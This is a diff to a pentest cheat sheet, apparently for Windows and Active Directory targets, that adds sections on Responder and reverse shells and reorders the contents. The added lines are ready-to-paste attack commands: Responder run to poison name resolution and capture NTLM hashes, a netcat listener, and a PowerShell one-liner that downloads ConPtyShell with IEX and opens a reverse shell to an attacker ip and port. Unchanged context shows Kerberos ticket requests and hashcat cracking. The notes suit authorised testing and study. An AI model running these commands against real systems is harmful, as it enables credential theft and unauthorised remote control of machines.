@@ -4,18 +4,20 @@
 </picture>
 
 ---
-
-- [DMP File](#dmp-file)
-- [Enum4Linux](#enum4linux)
 - [Enumeration](#enumeration)
-- [Exfiltration](#exfiltration)
-- [IMPACKET](#impacket)
+- [Enum4Linux](#enum4linux)
+- [SMB](#smb)
+- [MSRPC](#msrpc)
+- [WinRM](#winrm)
 - [Kerberos](#kerberos)
 - [Ldap](#ldap)
-- [MSRPC](#msrpc)
-- [SMB](#SMB)
+- [IMPACKET](#impacket)
+- [Responder](#responder)
+- [Exfiltration](#exfiltration)
+- [DMP File](#dmp-file)
 - [Virus](#virus)
-- [WinRM](#winrm)
+- [Reverse shell](#reverse-shell)
+- [Useful links](#useful-links)
 
 # Enumeration
 ## Scripts
@@ -199,6 +201,20 @@ python GetUserSPNs.py -dc-ip IP -outputfile KERBEROS_FILE_OUTPUT -request -debug
 hashcat -m 13100 --force -a 0 KERBEROS_FILE /usr/share/wordlists/rockyou.txt
 ```
 
+# Responder
+> Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.  
+> Basicaly a rogue everything use for exemple to steal NLTLM Hash, usernames...  [source](https://github.com/lgandx/Responder)
+
+Server (attacker) :
+```bash
+python Responder.py -I interface
+```
+
+Client (victim):
+```powershell
+gci \\ip\test\test
+```
+
 ### GetNPUsers
 > [GetNPUsers.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/impacket_0_10_0/examples/GetNPUsers.py) will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set.
 
@@ -254,3 +270,22 @@ bulk_extractor -o bulk_output memory.dmp
 - [Cobalt Strike: Using Known Private Keys To Decrypt Traffic – Part 1](https://blog.nviso.eu/2021/10/21/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-1/)
 - [Cobalt Strike: Using Known Private Keys To Decrypt Traffic – Part 2](https://blog.nviso.eu/2021/10/27/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-2/)
 - [Cobalt Strike: Using Process Memory To Decrypt Traffic – Part 3](https://blog.nviso.eu/2021/11/03/cobalt-strike-using-process-memory-to-decrypt-traffic-part-3/)
+
+# Reverse shell
+### ConPtyShell
+> ConPtyShell is a Fully Interactive Reverse Shell for Windows systems. *[source](https://github.com/antonioCoco/ConPtyShell)*
+
+Server :
+```bash
+stty raw -echo; (stty size; cat) | nc -lvnp port
+```
+Client with internet access: 
+```bash
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ip port
+```
+without : create shell.ps1, paste the Invoke-ConPtyShell.ps1, add '**Invoke-ConPtyShell ip port**' on a new line
+
+# Useful links
+Interactive Windows cheatsheet : [Wadcoms](https://wadcoms.github.io/)
+
+
